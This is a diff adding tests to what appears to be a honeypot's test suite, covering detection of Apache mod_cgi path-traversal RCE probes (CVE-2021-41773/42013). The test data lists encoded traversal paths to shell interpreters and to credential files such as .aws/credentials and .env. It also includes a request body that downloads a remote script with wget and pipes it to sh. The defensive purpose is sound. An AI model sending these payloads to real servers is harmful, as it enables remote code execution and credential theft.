@@ -630,6 +630,7 @@ def test_all_trap_families_default_on():
     assert tbenv.HIKVISION_ENABLED
     assert tbenv.HNAP1_ENABLED
     assert tbenv.SOHO_ROUTER_ENABLED
+    assert tbenv.CGI_TRAVERSAL_RCE_ENABLED
     assert tbenv.SERVER_STATUS_ENABLED
     assert tbenv.GEOSERVER_ENABLED
     assert tbenv.LIFERAY_ENABLED
@@ -16443,3 +16444,72 @@ async def test_soho_router_disabled_returns_404(flux_client, monkeypatch):
     resp = await flux_client.get("/boaform/admin/formLogin")
     assert resp.status == 404
     assert _log_entries(flux_client.log_path)[-1]["result"] == "not-handled"
+
+
+# ---------------------------------------------------------------------------
+# Apache mod_cgi traversal RCE (CVE-2021-41773 / CVE-2021-42013)
+# ---------------------------------------------------------------------------
+
+def test_cgi_traversal_rce_enabled_by_default():
+    assert tbenv.CGI_TRAVERSAL_RCE_ENABLED
+
+
+def test_cgi_traversal_rce_matches_observed_probe_shapes():
+    """Single-encoded (41773), double-encoded (42013), `usr/` prefixed, and
+    non-`/cgi-bin/` alias directories all resolve to a shell interpreter."""
+    for target in [
+        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
+        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
+        "/cgi-bin/.%2E/.%2E/bin/sh",
+        "/cgi-bin/%2e%2e/%2e%2e/bin/sh",
+        "/cgi-bin/%252e%252e/%252e%252e/bin/sh",
+        "/icons/.%2e/.%2e/usr/bin/bash",
+        "/cgi-bin/.%2e/.%2e/bin/dash",
+        "/cgi-bin/.%2e/.%2e/bin/busybox",
+        "/cgi-bin/.%2e/.%2e/bin/sh?x=1",
+    ]:
+        assert tbenv.is_cgi_traversal_rce_target(target), target
+
+
+def test_cgi_traversal_rce_does_not_match_file_reads():
+    """File-read variants of the same CVE keep flowing through
+    normalisation into the canary trap table, which answers them with
+    credential material — claiming them here would serve shell output
+    instead."""
+    for target in [
+        "/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/hosts",
+        "/cgi-bin/%252e%252e/%252e%252e/root/%2eaws/credentials",
+        "/cgi-bin/%252e%252e/%252e%252e/var/www/html/%2eenv",
+        "/cgi-bin/.%2e/.%2e/etc/passwd",
+    ]:
+        assert not tbenv.is_cgi_traversal_rce_target(target), target
+
+
+def test_cgi_traversal_rce_non_match():
+    for target in [
+        "", "/", "/bin/sh", "/cgi-bin/index.php", "/cgi-bin/bin/sh",
+        # One traversal segment is not the CVE shape.
+        "/cgi-bin/.%2e/bin/sh",
+        # Traversal that lands somewhere other than an interpreter.
+        "/cgi-bin/.%2e/.%2e/bin/shell.php",
+    ]:
+        assert not tbenv.is_cgi_traversal_rce_target(target), target
+
+
+def test_cgi_traversal_command_extraction_strips_cgi_preamble():
+    body = b"echo Content-Type: text/plain; echo; wget http://198.51.100.9/a -O- | sh"
+    assert tbenv.extract_cgi_traversal_command(body) == "wget http://198.51.100.9/a -O- | sh"
+
+
+def test_cgi_traversal_command_extraction_variants():
+    # Case and spacing vary between PoC copies.
+    assert tbenv.extract_cgi_traversal_command(
+        b"echo content-type:text/plain;echo;id",
+    ) == "id"
+    # No preamble at all — the whole body is the command.
+    assert tbenv.extract_cgi_traversal_command(b"uname -a") == "uname -a"
+    # Empty body is a bare probe, not a command.
+    assert tbenv.extract_cgi_traversal_command(b"") == ""
+    assert tbenv.extract_cgi_traversal_command(
+        b"echo Content-Type: text/plain; echo;",
+    ) == ""
